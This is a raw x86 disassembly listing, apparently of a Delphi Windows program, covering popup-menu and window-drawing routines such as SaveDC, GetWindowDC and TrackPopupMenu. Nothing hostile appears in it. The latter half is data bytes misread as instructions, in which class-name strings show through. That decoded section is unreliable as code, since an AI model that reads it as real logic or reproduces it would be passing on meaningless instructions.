jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45ad40
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov dx [ esi + 0x4 ]
call sub_44dc98
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d768
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44ec6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44ec51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41dde0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41dc80
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44f0e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ec58
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41dde0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_44e4f8
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_44dbf8
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44dbf8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_44edb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d768
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44ed8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44ed6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41dde0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41dc80
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ed76
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41dde0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_437680
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ad40
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44dbf8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_44dbf8
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_44dbf8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_44dc28
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_44dc28
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45a9e4
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_45aa4c
jmp r-xdata
sub_44ed93
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_44ee4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_413eec
pop esi
pop ebx
retn
push ebx
push sub_44e8bc
call sub_41ab9c
mov [ ebx + 0x10 ] eax
sub_44ee90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44da10
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_44ee4c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_44ef04
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44ee74
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44daac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_44ef5c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_449da8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_44e718
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44e718
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_44efa4
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_449da8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459590
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403394
mov edx eax
jmp r-xdata
sub_44eff0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412bb8
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_44ef5c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44d364
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44d860
mov eax [ ebx + 0x34 ]
call sub_44ac08
mov eax ebx
call sub_44e208
mov eax ebx
call sub_44efa4
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_44ad38
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44f0a4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414098
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414098
cmp ebp [ eax ]
jne r-xdata
sub_44f0e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d618
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41ce24
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41d618
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41ce24
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403394
mov edx [ r-xdata ]
call sub_403324
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d618
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41ce24
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_44f1c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403f3c
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4041a8
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404448
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4041a8
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404448
jmp r-xdata
sub_44f25c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403ee8
mov ebx 0x1
mov eax esi
call sub_4041a8
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_4040d0
sub_44f2c0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f319
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44f1c8
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44f1c8
mov eax [ ebp - 0x8 ]
pop edx
call sub_407e00
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f320
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
sub_44f328
adc al [ eax ]
add [ eax ] al
push eax
mov esp 0xc0780047
inc edi
add [ esp + edi * 4 + 0x47 ] cl
add [ eax + eax * 8 ] ah
inc edi
add [ eax - 0x44 ] cl
inc edi
add ah cl
mov edi 0xbc440047
inc edi
add [ eax ] al
rol [ edi ] 0x40
mov esp 0xc33c0047
inc edi
add [ esp + edi * 4 ] bh
inc edi
add [ eax ] cl
rol [ edi ] 0x38
mov esp 0xc1a00047
inc edi
add [ esp + edi * 4 ] dh
inc edi
add ah bh
rol [ edi ] 0x30
mov esp 0xc3cc0047
inc edi
add [ esp + edi * 4 ] ch
inc edi
add al cl
retn
sub_44f37a
inc edi
add [ eax ] ch
mov esp 0xc0b80047
inc edi
add [ esp + edi * 4 ] ah
inc edi
add [ eax + 0x200047c3 ] cl
mov esp 0xc3440047
inc edi
add [ esp + edi * 4 ] bl
inc edi
add [ eax ] bl
les eax [ edi ]
sbb [ edi + eax * 2 + 0x47c3ec00 ] bh
add [ esp + edi * 4 ] dl
inc edi
add al cl
rol [ edi ] 0x10
mov esp 0xc0d80047
inc edi
add [ esp + edi * 4 ] cl
inc edi
add [ ecx + eax * 8 ] bl
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_44f420
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f427
retn
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
call sub_403198
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404970
mov eax rw-data
call sub_403ee8
sub_44f42c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_44f328
call sub_403c94
mov eax [ r-xdata ]
call sub_413884
mov eax [ r-xdata ]
call sub_413924
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4138d0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4138d0
mov eax [ r-xdata ]
call sub_413794
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4244e8
mov [ rw-data ] eax
sub_44f4d2
inc esp
add [ ebx ] al
andps xmm2 [ ebx + 0x63 ]
jb r-xdata
inc eax
add ah dh
xor eax [ eax ]
call 0x30453588
xor [ eax ] eax
dec esp
xor [ eax ] eax
insb
insb
inc edx
popad
jb r-xdata
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
insb
cmc
inc esp
add [ eax ] cl
add [ eax ] al
mov esp 0xe000411d
xor eax [ eax ]
in al dx
xor eax [ eax ]
je r-xdata
outsd
hlt
jb r-xdata
rol [ ebp + esi * 8 + 0x11070044 ] 0x54
inc ebx
outsd
sub [ esi + 0x41 ] al
add [ eax ] bh
inc edi
inc ecx
add [ eax + 0x47 ] al
inc ecx
add [ eax + 0x18 ] cl
inc ebp
add [ ecx ] dl
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al dl
hlt
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
jae r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
dec [ eax + 0x100451f ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + eax ] ah
add bh bh
sub [ edi ] bl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
test ch dh
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] edx
jae r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
push eax
and [ ebp ] al
add al 0x21
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add bh bh
inc eax
sbb [ ebp ] al
jb r-xdata
cmc
inc esp
add [ eax ] dh
push ds
inc ecx
add [ 0x6f460500 ] cl
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
jmp [ eax + 0x45 ]
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
pop ds
inc ebp
add [ ecx ] al
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_41b0b4
sub [ eax ] al
add bh bh
insb
pop ds
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
cmc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
xor eax [ eax ]
adc al 0x9b
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x9 ] ch
inc esp
add [ eax ] cl
ja r-xdata
outsd
insb
outsd
jb r-xdata
adc eax 0xecb03c01
add al dh
and eax [ ebp ]
loopne r-xdata
sbb [ eax + eax - 0x68 ] al
loopne r-xdata
dec esi
outsd
jb r-xdata
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
add bh bh
mov al [ 0x100451f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
push esi
outsd
insb
nop
adc cl bh
inc esp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add [ edx + ebp + 0x45 ] ch
add [ eax + 0x24 ] al
inc ebp
add al bh
loope r-xdata
mov [ ebx ] cs
inc ebx
add [ eax ] al
and al 0x45
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ edi + 0x43 ] ch
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add ah bh
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
add [ esi + eax * 2 + 0x41 ] dl
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ eax ] al
je r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
jb r-xdata
outsd
insb
cld
test [ eax + eax - 0x34 ] 0xd004369
add [ 0x6d726f46 ] al
jae r-xdata
fsubr [ edx ]
inc ebp
add [ eax ] ah
sub [ ebp ] eax
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x233c0041 ]
inc ebp
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
inc eax
0xcd4c0043 0x43
pop eax
mov [ 0xffffffffa1d80043 ] eax
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
[ eax + 0x1004520 ]
outsd
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
jb r-xdata
stc
inc esp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
cmc
inc esp
add [ eax ] cl
add al [ eax ]
add [ eax + 0x80044f5 ] al
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
and [ eax * 2 + 0x53541400 ] 0x63
jb r-xdata
inc eax
dec [ eax + 0x29 ]
inc ebp
add [ edx + ebp ] ah
inc ebp
add [ eax + 0x2a ] cl
inc ebp
add ah bl
sub al [ ebp ]
and [ ecx ] ch
inc ebp
add [ eax + 0x14004524 ] al
push esp
push ebx
arpl [ edx + 0x6f ] si
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ eax + 0x24 ] ah
inc ebp
add [ eax ] dl
daa
inc ebp
add [ ecx + ebp + 0x45 ] al
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc ecx
add al al
sahf
jae r-xdata
add [ ebx ] al
add [ eax ] al
add ah cl
cli
inc esp
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
popad
jb r-xdata
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x50044f9 ] cl
inc esi
outsd
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
sbb al 0xfa
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0xffffffff88000000 ] al
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
adc [ ecx ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ edi + esi * 8 + 0x44 ] ch
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov ah 0x23
inc ebp
sar ah 0xf7
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
stc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
clc
inc esp
add dh dh
clc
inc esp
add [ edx + eax ] bl
add [ eax ] al
sbb [ esi + 0x43 ] ah
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x57fffc0 ]
inc esp
add bh bh
insd
and al 0x11
add [ ebx ] al
lea eax [ eax ]
cmp dl 0x44
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
jb r-xdata
outsd
insb
stc
inc esp
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x44fa50c0 ]
add [ edi ] cl
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add al dl
cli
stc
inc esp
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0x88000000
inc esp
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add [ edx + edi * 8 ] bl
outsd
imul eax [ eax ] 0x28
inc ecx
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
push cs
jo r-xdata
mov eax eax
and bl bh
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + edi * 8 + 0x44 ] bh
add [ eax ] cl
jae r-xdata
